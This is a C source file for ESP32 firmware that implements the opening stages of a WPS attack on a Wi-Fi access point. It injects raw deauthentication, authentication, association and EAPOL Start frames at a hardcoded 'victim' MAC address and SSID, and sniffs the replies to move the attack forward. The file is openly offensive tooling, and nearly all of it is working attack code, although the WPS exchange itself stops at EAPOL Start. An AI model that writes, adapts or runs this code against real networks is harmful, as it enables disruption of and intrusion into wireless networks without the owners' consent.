#include <string.h>
#include <libwifi.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "ap_scanner.h"
#include "wps.h"
#include "sniffer.h"
#include "utils.h"
#include "wifi_controller.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "eapol_packet.h"

#define DATA_MAC_CAST (const unsigned char *)
#define DATA_SSID_CAST (const char *)
enum wps_attack_status {
    INIT,
    DEAUTHENTICATION,
    AUTHENTICATION,
    AUTHENTICATION_OK,
    WAIT_RESPONSE,
    ASSOCIATION,
    EAPOL_START,
    UNKNOWN
};
static const char *TAG = "WPS"; 
static TaskHandle_t wps_task_handler = NULL;
static unsigned char wifi_mac[] = { 0xa0, 0x88, 0xb4, 0x7a, 0xc4, 0xcc };
static unsigned char victim_mac[] = { 0x50, 0xc7, 0xbf, 0x5d, 0x7c, 0xa5 };
static char victim_ssid[] = "Maroc";
static int victim_channel = 1;
int32_t wps_attack_current_status = UNKNOWN;

static void wps_attack_state_machine( void *args )
{
    while( true ){
        /*
        * Initialize all variables
        */
        if( wps_attack_current_status == INIT ){
            ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, wifi_mac));
            //Next
            wps_attack_current_status = DEAUTHENTICATION;
            ESP_LOGI(TAG, "WPS Transaction init.");
        }

        /*
        * In this state we deauthenticare ourself from the ap
        */
        else if( wps_attack_current_status == DEAUTHENTICATION ){
            struct libwifi_deauth deauth = {0};
            libwifi_create_deauth(&deauth, DATA_MAC_CAST&victim_mac, DATA_MAC_CAST&wifi_mac, DATA_MAC_CAST&victim_mac, 7);
            int deauth_len = libwifi_get_deauth_length(&deauth);
            unsigned char *buf = malloc(deauth_len);
            int dump_len = libwifi_dump_deauth(&deauth, buf, deauth_len);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, dump_len, false);
            free(buf);
            libwifi_free_deauth(&deauth);
            //NEXT
            wps_attack_current_status = AUTHENTICATION;
            ESP_LOGI(TAG, "Deauthentication request.");
        }

        /*
        * Send AUTHENTICATION request
        */
        else if( wps_attack_current_status == AUTHENTICATION ){
            uint16_t transaction_sequence = 1;
            uint16_t status_code = 0;
            struct libwifi_auth auth_req = { 0 };
            libwifi_create_auth(&auth_req, DATA_MAC_CAST&victim_mac, DATA_MAC_CAST&wifi_mac, DATA_MAC_CAST&victim_mac, AUTH_OPEN, transaction_sequence, status_code);
            int auth_req_len = libwifi_get_auth_length(&auth_req);
            unsigned char *buf = malloc(auth_req_len);
            int dump_len = libwifi_dump_auth(&auth_req, buf, auth_req_len);
            //Send multiple death packet
            for(int i = 0; i < 1; i++){
                esp_wifi_80211_tx(WIFI_IF_AP, buf, dump_len, false);
            }
            free(buf);
            libwifi_free_auth(&auth_req);
            //NEXT
            wps_attack_current_status = WAIT_RESPONSE;
            ESP_LOGI(TAG, "Authentication request.");
        }

        /*
        * Wait for authentication response
        */
        else if( wps_attack_current_status == WAIT_RESPONSE ){
            //Do nothing wait for next status
            vTaskDelay(100 / portTICK_PERIOD_MS);
            //Kill task, must be reopened on response
            //vTaskDelete(wps_task_handler);
        }

        /*
        * Association request
        */
        else if( wps_attack_current_status == ASSOCIATION ){
            struct libwifi_assoc_req assoc_req = { 0 };
            libwifi_create_assoc_req(&assoc_req, DATA_MAC_CAST&victim_mac, DATA_MAC_CAST&wifi_mac, DATA_MAC_CAST&victim_mac, DATA_SSID_CAST&victim_ssid, victim_channel);
            int assoc_req_len = libwifi_get_assoc_req_length(&assoc_req);
            unsigned char *buf = malloc(assoc_req_len);
            int dump_len = libwifi_dump_assoc_req(&assoc_req, buf, assoc_req_len);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, dump_len, false);
            free(buf);
            libwifi_free_assoc_req(&assoc_req);
            //NEXT
            wps_attack_current_status = WAIT_RESPONSE;
            ESP_LOGI(TAG, "Association request.");
        }

        /*
        * Send EAPOL Start request
        */
        else if( wps_attack_current_status == EAPOL_START ){
            struct libwifi_eapol_start eapol_start = { 0 };
            libwifi_create_eapol_start(&eapol_start, DATA_MAC_CAST&victim_mac, DATA_MAC_CAST&wifi_mac, DATA_MAC_CAST&victim_mac);         
            int eapol_start_len = libwifi_get_eapol_start_length(&eapol_start);
            unsigned char *buf = malloc(eapol_start_len);
            int dump_len = libwifi_dump_eapol_start(&eapol_start, buf, eapol_start_len);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, dump_len, false);
            free(buf);
            //NEXT
            wps_attack_current_status = WAIT_RESPONSE;
            ESP_LOGI(TAG, "EAPOL Start.");
        }
    
    }
}


/*
* Frame used by wps are:
* PKT_DATA_QOS_DATA
* PKT_DATA
* PKT_ASSOC_RESPONSE
* PKT_DEAUTH
* PKT_AUTH
* PKT_ASSOC_RESPONSE
*/
static void wps_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    struct libwifi_frame frame = { 0 };
    wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *) event_data;
    unsigned long data_len = ppkt->rx_ctrl.sig_len;
    int ret = libwifi_get_wifi_frame(&frame, (const unsigned char*)ppkt->payload, data_len, 0);
    if (ret < 0) {
        goto free_mem;
    }

    if( !mac_compare(frame.header.mgmt_ordered.addr1, (unsigned char *)&victim_mac) && !mac_compare(frame.header.mgmt_ordered.addr2, (unsigned char *)&victim_mac)){
        goto free_mem;
    }

    if( event_id == PKT_AUTH ){
        struct libwifi_auth auth_res = { 0 };
        ret = libwifi_parse_auth(&auth_res, &frame);
        if( auth_res.fixed_parameters.transaction_sequence == 2 && auth_res.fixed_parameters.status_code == 0 ){
            wps_attack_current_status = ASSOCIATION;
            ESP_LOGI(TAG, "Authentication successful.");
        }
        libwifi_free_auth(&auth_res);
        goto free_mem;
    }

    if( event_id == PKT_ASSOC_RESPONSE ){
        struct libwifi_assoc_resp assoc_resp = { 0 };
        ret = libwifi_parse_assoc_response(&assoc_resp, &frame);
        if( assoc_resp.fixed_parameters.status_code == 0 ){
            wps_attack_current_status = EAPOL_START;
            ESP_LOGI(TAG, "Association response.");
        }
        libwifi_free_assoc_resp(&assoc_resp);
        goto free_mem;
    }

free_mem:
    libwifi_free_wifi_frame(&frame);
}



void wps_attack_start( void )
{
    wps_attack_current_status = INIT;
    wifictl_sniffer_start(victim_channel);
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, PKT_AUTH, &wps_frame_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, PKT_ASSOC_RESPONSE, &wps_frame_handler, NULL));
    xTaskCreate(&wps_attack_state_machine, "wps_attack_task", 4096, NULL, 6, &wps_task_handler);
}